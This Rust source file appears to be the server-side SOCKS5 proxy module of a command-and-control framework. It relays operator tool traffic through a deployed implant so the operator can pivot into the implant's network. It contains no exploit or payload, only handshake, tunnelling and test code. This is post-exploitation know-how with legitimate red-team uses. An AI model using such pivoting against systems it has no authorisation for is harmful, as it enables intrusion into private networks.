//! Server-side SOCKS5 proxy implementation
//!
//! When an operator starts a SOCKS proxy, this module:
//! 1. Binds a local TCP listener
//! 2. Accepts SOCKS5 connections from operator tools (proxychains, etc.)
//! 3. Tunnels data through the implant via task-based channels
//! 4. Relays responses back to the operator

use std::io::{Read, Write};
use std::net::{SocketAddr, TcpListener, TcpStream};
use std::sync::atomic::{AtomicBool, AtomicU32, AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

use dashmap::DashMap;
use tokio::sync::mpsc;

use common::ImplantId;

/// SOCKS5 protocol constants
const SOCKS5_VERSION: u8 = 0x05;
const SOCKS5_AUTH_NONE: u8 = 0x00;
const SOCKS5_CMD_CONNECT: u8 = 0x01;
const SOCKS5_ATYP_IPV4: u8 = 0x01;
const SOCKS5_ATYP_DOMAIN: u8 = 0x03;
const SOCKS5_ATYP_IPV6: u8 = 0x04;
const SOCKS5_REP_SUCCESS: u8 = 0x00;
const SOCKS5_REP_FAILURE: u8 = 0x01;
const _SOCKS5_REP_CONN_REFUSED: u8 = 0x05;

/// Unique ID for each SOCKS proxy instance
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub struct ProxyInstanceId(pub uuid::Uuid);

impl ProxyInstanceId {
    pub fn new() -> Self {
        Self(uuid::Uuid::new_v4())
    }

    pub fn as_bytes(&self) -> &[u8; 16] {
        self.0.as_bytes()
    }
}

impl Default for ProxyInstanceId {
    fn default() -> Self {
        Self::new()
    }
}

/// Channel ID for multiplexing connections through a single proxy
type ChannelId = u32;

/// Statistics for a SOCKS proxy instance
#[derive(Debug, Default)]
pub struct ProxyStats {
    pub bytes_in: AtomicU64,
    pub bytes_out: AtomicU64,
    pub active_connections: AtomicU32,
    pub total_connections: AtomicU64,
}

/// A running SOCKS proxy instance
pub struct SocksProxyInstance {
    pub id: ProxyInstanceId,
    pub implant_id: ImplantId,
    pub bind_addr: SocketAddr,
    pub version: SocksVersion,
    pub stats: Arc<ProxyStats>,
    pub running: Arc<AtomicBool>,
    /// Channel for sending data to be forwarded through the implant
    pub data_tx: mpsc::UnboundedSender<ProxyData>,
    /// Active channels (connection_id -> client stream info)
    pub channels: Arc<DashMap<ChannelId, ChannelState>>,
    channel_counter: Arc<AtomicU32>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SocksVersion {
    Socks4,
    Socks5,
}

/// State for a single multiplexed connection through the proxy
pub struct ChannelState {
    pub target_host: String,
    pub target_port: u16,
    pub connected: bool,
    /// Remote client address (the operator's proxy client)
    pub remote_addr: String,
    /// Bytes received from the client
    pub bytes_in: AtomicU64,
    /// Bytes sent to the client
    pub bytes_out: AtomicU64,
    /// When this connection was established (millis since epoch)
    pub connected_at: i64,
    /// Sender for data coming back from the implant to be written to the client
    pub response_tx: mpsc::UnboundedSender<Vec<u8>>,
}

/// Information about an active proxy connection for reporting
#[derive(Debug, Clone)]
pub struct ConnectionInfo {
    pub channel_id: u32,
    pub remote_addr: String,
    pub target_addr: String,
    pub bytes_in: u64,
    pub bytes_out: u64,
    pub connected_at: i64,
}

/// Data to be sent through the proxy tunnel
#[derive(Debug, Clone)]
pub struct ProxyData {
    pub channel_id: ChannelId,
    pub data: Vec<u8>,
    pub eof: bool,
}

/// Request to establish a new SOCKS connection
#[derive(Debug, Clone)]
pub struct SocksConnectRequest {
    pub channel_id: ChannelId,
    pub target_host: String,
    pub target_port: u16,
}

impl SocksProxyInstance {
    /// Create a new SOCKS proxy instance
    pub fn new(
        implant_id: ImplantId,
        bind_host: &str,
        bind_port: u16,
        version: SocksVersion,
    ) -> std::io::Result<(Self, TcpListener)> {
        let bind_addr = format!("{}:{}", bind_host, bind_port);
        let listener = TcpListener::bind(&bind_addr)?;
        let local_addr = listener.local_addr()?;

        let (data_tx, _data_rx) = mpsc::unbounded_channel();

        let instance = Self {
            id: ProxyInstanceId::new(),
            implant_id,
            bind_addr: local_addr,
            version,
            stats: Arc::new(ProxyStats::default()),
            running: Arc::new(AtomicBool::new(true)),
            data_tx,
            channels: Arc::new(DashMap::new()),
            channel_counter: Arc::new(AtomicU32::new(1)),
        };

        Ok((instance, listener))
    }

    /// Allocate a new channel ID
    pub fn next_channel_id(&self) -> ChannelId {
        self.channel_counter.fetch_add(1, Ordering::SeqCst)
    }

    /// Register a new channel
    pub fn register_channel(
        &self,
        channel_id: ChannelId,
        target_host: String,
        target_port: u16,
        remote_addr: String,
    ) -> mpsc::UnboundedReceiver<Vec<u8>> {
        let (response_tx, response_rx) = mpsc::unbounded_channel();
        let now = chrono::Utc::now().timestamp_millis();

        self.channels.insert(
            channel_id,
            ChannelState {
                target_host,
                target_port,
                connected: false,
                remote_addr,
                bytes_in: AtomicU64::new(0),
                bytes_out: AtomicU64::new(0),
                connected_at: now,
                response_tx,
            },
        );

        self.stats.active_connections.fetch_add(1, Ordering::SeqCst);
        self.stats.total_connections.fetch_add(1, Ordering::SeqCst);

        response_rx
    }

    /// Get information about all active connections
    pub fn get_connections(&self) -> Vec<ConnectionInfo> {
        self.channels
            .iter()
            .map(|entry| {
                let channel_id = *entry.key();
                let state = entry.value();
                ConnectionInfo {
                    channel_id,
                    remote_addr: state.remote_addr.clone(),
                    target_addr: format!("{}:{}", state.target_host, state.target_port),
                    bytes_in: state.bytes_in.load(Ordering::SeqCst),
                    bytes_out: state.bytes_out.load(Ordering::SeqCst),
                    connected_at: state.connected_at,
                }
            })
            .collect()
    }

    /// Mark a channel as connected
    pub fn mark_connected(&self, channel_id: ChannelId) {
        if let Some(mut entry) = self.channels.get_mut(&channel_id) {
            entry.connected = true;
        }
    }

    /// Remove a channel
    pub fn remove_channel(&self, channel_id: ChannelId) {
        if self.channels.remove(&channel_id).is_some() {
            self.stats.active_connections.fetch_sub(1, Ordering::SeqCst);
        }
    }

    /// Deliver data from the implant to a channel
    pub fn deliver_data(&self, channel_id: ChannelId, data: Vec<u8>) {
        if let Some(channel) = self.channels.get(&channel_id) {
            let _ = channel.response_tx.send(data);
        }
    }

    /// Check if the proxy is still running
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    /// Stop the proxy
    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    /// Get current statistics
    pub fn get_stats(&self) -> (u64, u64, u32, u64) {
        (
            self.stats.bytes_in.load(Ordering::SeqCst),
            self.stats.bytes_out.load(Ordering::SeqCst),
            self.stats.active_connections.load(Ordering::SeqCst),
            self.stats.total_connections.load(Ordering::SeqCst),
        )
    }
}

/// Manager for all active SOCKS proxy instances
pub struct SocksProxyManager {
    /// Active proxy instances by ID
    instances: DashMap<ProxyInstanceId, Arc<SocksProxyInstance>>,
    /// Map from implant ID to proxy instances
    by_implant: DashMap<ImplantId, Vec<ProxyInstanceId>>,
}

impl SocksProxyManager {
    pub fn new() -> Self {
        Self {
            instances: DashMap::new(),
            by_implant: DashMap::new(),
        }
    }

    /// Start a new SOCKS proxy for an implant
    pub fn start_proxy(
        &self,
        implant_id: ImplantId,
        bind_host: &str,
        bind_port: u16,
        version: SocksVersion,
        connect_callback: impl Fn(SocksConnectRequest) + Send + Sync + 'static,
        data_callback: impl Fn(ProxyInstanceId, ProxyData) + Send + Sync + 'static,
    ) -> std::io::Result<ProxyInstanceId> {
        let (instance, listener) = SocksProxyInstance::new(
            implant_id,
            bind_host,
            bind_port,
            version,
        )?;

        let instance_id = instance.id;
        let instance = Arc::new(instance);

        // Track the instance
        self.instances.insert(instance_id, Arc::clone(&instance));
        self.by_implant
            .entry(implant_id)
            .or_default()
            .push(instance_id);

        // Spawn the accept loop
        let accept_instance = Arc::clone(&instance);
        let connect_callback = Arc::new(connect_callback);
        let data_callback = Arc::new(data_callback);

        thread::spawn(move || {
            listener.set_nonblocking(false).ok();

            while accept_instance.is_running() {
                // Set a timeout so we can check the running flag periodically
                listener.set_nonblocking(true).ok();

                match listener.accept() {
                    Ok((stream, peer_addr)) => {
                        let instance = Arc::clone(&accept_instance);
                        let connect_cb = Arc::clone(&connect_callback);
                        let data_cb = Arc::clone(&data_callback);

                        thread::spawn(move || {
                            if let Err(e) = handle_socks_client(
                                stream,
                                peer_addr,
                                instance,
                                connect_cb,
                                data_cb,
                            ) {
                                tracing::debug!(
                                    error = %e,
                                    peer = %peer_addr,
                                    "SOCKS client error"
                                );
                            }
                        });
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(100));
                    }
                    Err(e) => {
                        tracing::warn!(error = %e, "SOCKS accept error");
                        thread::sleep(Duration::from_millis(100));
                    }
                }
            }

            tracing::info!(
                proxy_id = %accept_instance.id.0,
                "SOCKS proxy accept loop stopped"
            );
        });

        tracing::info!(
            proxy_id = %instance_id.0,
            implant_id = %implant_id,
            bind_addr = %instance.bind_addr,
            "SOCKS proxy started"
        );

        Ok(instance_id)
    }

    /// Stop a proxy
    pub fn stop_proxy(&self, proxy_id: ProxyInstanceId) -> bool {
        if let Some((_, instance)) = self.instances.remove(&proxy_id) {
            instance.stop();

            // Remove from by_implant map
            if let Some(mut ids) = self.by_implant.get_mut(&instance.implant_id) {
                ids.retain(|id| *id != proxy_id);
            }

            tracing::info!(proxy_id = %proxy_id.0, "SOCKS proxy stopped");
            true
        } else {
            false
        }
    }

    /// Get a proxy instance
    pub fn get(&self, proxy_id: ProxyInstanceId) -> Option<Arc<SocksProxyInstance>> {
        self.instances.get(&proxy_id).map(|r| Arc::clone(r.value()))
    }

    /// List all proxies, optionally filtered by implant
    pub fn list(&self, implant_filter: Option<ImplantId>) -> Vec<Arc<SocksProxyInstance>> {
        self.instances
            .iter()
            .filter(|entry| {
                implant_filter
                    .map(|id| entry.value().implant_id == id)
                    .unwrap_or(true)
            })
            .map(|entry| Arc::clone(entry.value()))
            .collect()
    }

    /// Deliver data from implant to the appropriate channel
    pub fn deliver_implant_data(
        &self,
        proxy_id: ProxyInstanceId,
        channel_id: ChannelId,
        data: Vec<u8>,
    ) {
        if let Some(instance) = self.instances.get(&proxy_id) {
            instance.deliver_data(channel_id, data);
        }
    }
}

impl Default for SocksProxyManager {
    fn default() -> Self {
        Self::new()
    }
}

/// Handle a single SOCKS5 client connection
fn handle_socks_client(
    mut client: TcpStream,
    peer_addr: SocketAddr,
    instance: Arc<SocksProxyInstance>,
    connect_callback: Arc<dyn Fn(SocksConnectRequest) + Send + Sync>,
    data_callback: Arc<dyn Fn(ProxyInstanceId, ProxyData) + Send + Sync>,
) -> std::io::Result<()> {
    client.set_read_timeout(Some(Duration::from_secs(30)))?;
    client.set_write_timeout(Some(Duration::from_secs(30)))?;
    client.set_nodelay(true)?;

    // SOCKS5 handshake
    let mut buf = [0u8; 258];
    let n = client.read(&mut buf[..2])?;
    if n < 2 || buf[0] != SOCKS5_VERSION {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "invalid SOCKS5 handshake",
        ));
    }

    let nmethods = buf[1] as usize;
    client.read_exact(&mut buf[..nmethods])?;

    // We only support no-auth for now
    client.write_all(&[SOCKS5_VERSION, SOCKS5_AUTH_NONE])?;

    // Read CONNECT request
    let mut req = [0u8; 4];
    client.read_exact(&mut req)?;

    if req[0] != SOCKS5_VERSION || req[1] != SOCKS5_CMD_CONNECT {
        client.write_all(&[
            SOCKS5_VERSION,
            SOCKS5_REP_FAILURE,
            0,
            SOCKS5_ATYP_IPV4,
            0, 0, 0, 0,
            0, 0,
        ])?;
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            "only CONNECT supported",
        ));
    }

    // Parse destination address
    let (target_host, target_port) = parse_socks_address(&mut client, req[3])?;

    tracing::debug!(
        peer = %peer_addr,
        target = %format!("{}:{}", target_host, target_port),
        "SOCKS CONNECT request"
    );

    // Allocate a channel ID
    let channel_id = instance.next_channel_id();

    // Register the channel and get the response receiver
    let mut response_rx = instance.register_channel(
        channel_id,
        target_host.clone(),
        target_port,
        peer_addr.to_string(),
    );

    // Notify the callback that we need to establish a connection
    connect_callback(SocksConnectRequest {
        channel_id,
        target_host: target_host.clone(),
        target_port,
    });

    // Wait for connection confirmation (with timeout)
    // In a real implementation, this would wait for the implant to report success
    // For now, we'll send success immediately and let the data flow handle errors
    let response = build_socks_response(
        SOCKS5_REP_SUCCESS,
        &"0.0.0.0:0".parse().unwrap(),
    );
    client.write_all(&response)?;

    instance.mark_connected(channel_id);

    tracing::debug!(
        channel_id,
        target = %format!("{}:{}", target_host, target_port),
        "SOCKS channel established"
    );

    // Now relay data bidirectionally
    // Clone instance for each closure that needs it
    let instance_for_recv = Arc::clone(&instance);
    let stats_for_recv = Arc::clone(&instance.stats);
    let channels_for_recv = Arc::clone(&instance.channels);

    // Client -> Implant (via data_callback)
    let client_clone = client.try_clone()?;
    let instance_id = instance.id;
    let data_cb = Arc::clone(&data_callback);
    let stats = Arc::clone(&instance.stats);
    let channels = Arc::clone(&instance.channels);

    let client_to_implant = thread::spawn(move || {
        let mut stream = client_clone;
        let mut buf = [0u8; 8192];

        loop {
            match stream.read(&mut buf) {
                Ok(0) => {
                    // EOF - send close
                    data_cb(
                        instance_id,
                        ProxyData {
                            channel_id,
                            data: vec![],
                            eof: true,
                        },
                    );
                    break;
                }
                Ok(n) => {
                    stats.bytes_out.fetch_add(n as u64, Ordering::SeqCst);
                    // Track per-channel bytes (data going out to target)
                    if let Some(ch) = channels.get(&channel_id) {
                        ch.bytes_out.fetch_add(n as u64, Ordering::SeqCst);
                    }
                    data_cb(
                        instance_id,
                        ProxyData {
                            channel_id,
                            data: buf[..n].to_vec(),
                            eof: false,
                        },
                    );
                }
                Err(_) => break,
            }
        }
    });

    // Implant -> Client (via response_rx)
    let implant_to_client = thread::spawn(move || {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();

        rt.block_on(async {
            while let Some(data) = response_rx.recv().await {
                if data.is_empty() {
                    break;
                }
                let len = data.len() as u64;
                stats_for_recv.bytes_in.fetch_add(len, Ordering::SeqCst);
                // Track per-channel bytes (data coming in from target)
                if let Some(ch) = channels_for_recv.get(&channel_id) {
                    ch.bytes_in.fetch_add(len, Ordering::SeqCst);
                }
                if client.write_all(&data).is_err() {
                    break;
                }
            }
        });

        let _ = client.shutdown(std::net::Shutdown::Write);
    });

    client_to_implant.join().ok();
    implant_to_client.join().ok();

    instance_for_recv.remove_channel(channel_id);

    tracing::debug!(channel_id, "SOCKS channel closed");

    Ok(())
}

/// Parse SOCKS5 address from stream
fn parse_socks_address(stream: &mut TcpStream, atyp: u8) -> std::io::Result<(String, u16)> {
    let host = match atyp {
        SOCKS5_ATYP_IPV4 => {
            let mut addr = [0u8; 4];
            stream.read_exact(&mut addr)?;
            format!("{}.{}.{}.{}", addr[0], addr[1], addr[2], addr[3])
        }
        SOCKS5_ATYP_DOMAIN => {
            let mut len = [0u8; 1];
            stream.read_exact(&mut len)?;
            let mut domain = vec![0u8; len[0] as usize];
            stream.read_exact(&mut domain)?;
            String::from_utf8(domain).map_err(|_| {
                std::io::Error::new(std::io::ErrorKind::InvalidData, "invalid domain")
            })?
        }
        SOCKS5_ATYP_IPV6 => {
            let mut addr = [0u8; 16];
            stream.read_exact(&mut addr)?;
            let mut parts = Vec::new();
            for i in 0..8 {
                parts.push(format!(
                    "{:x}",
                    u16::from_be_bytes([addr[i * 2], addr[i * 2 + 1]])
                ));
            }
            parts.join(":")
        }
        _ => {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                "unsupported address type",
            ))
        }
    };

    let mut port_buf = [0u8; 2];
    stream.read_exact(&mut port_buf)?;
    let port = u16::from_be_bytes(port_buf);

    Ok((host, port))
}

/// Build SOCKS5 response
fn build_socks_response(rep: u8, bound: &SocketAddr) -> Vec<u8> {
    let mut resp = vec![SOCKS5_VERSION, rep, 0x00];

    match bound {
        SocketAddr::V4(addr) => {
            resp.push(SOCKS5_ATYP_IPV4);
            resp.extend_from_slice(&addr.ip().octets());
            resp.extend_from_slice(&addr.port().to_be_bytes());
        }
        SocketAddr::V6(addr) => {
            resp.push(SOCKS5_ATYP_IPV6);
            resp.extend_from_slice(&addr.ip().octets());
            resp.extend_from_slice(&addr.port().to_be_bytes());
        }
    }

    resp
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_proxy_instance_id() {
        let id1 = ProxyInstanceId::new();
        let id2 = ProxyInstanceId::new();
        assert_ne!(id1, id2);
    }

    #[test]
    fn test_channel_id_counter() {
        let (instance, _listener) = SocksProxyInstance::new(
            ImplantId::new(),
            "127.0.0.1",
            0,
            SocksVersion::Socks5,
        ).unwrap();

        let id1 = instance.next_channel_id();
        let id2 = instance.next_channel_id();
        let id3 = instance.next_channel_id();

        assert_eq!(id1, 1);
        assert_eq!(id2, 2);
        assert_eq!(id3, 3);
    }

    #[test]
    fn test_build_socks_response_ipv4() {
        let addr: SocketAddr = "192.168.1.1:8080".parse().unwrap();
        let resp = build_socks_response(SOCKS5_REP_SUCCESS, &addr);

        assert_eq!(resp[0], SOCKS5_VERSION);
        assert_eq!(resp[1], SOCKS5_REP_SUCCESS);
        assert_eq!(resp[2], 0x00);
        assert_eq!(resp[3], SOCKS5_ATYP_IPV4);
        assert_eq!(&resp[4..8], &[192, 168, 1, 1]);
        assert_eq!(&resp[8..10], &8080u16.to_be_bytes());
    }
}
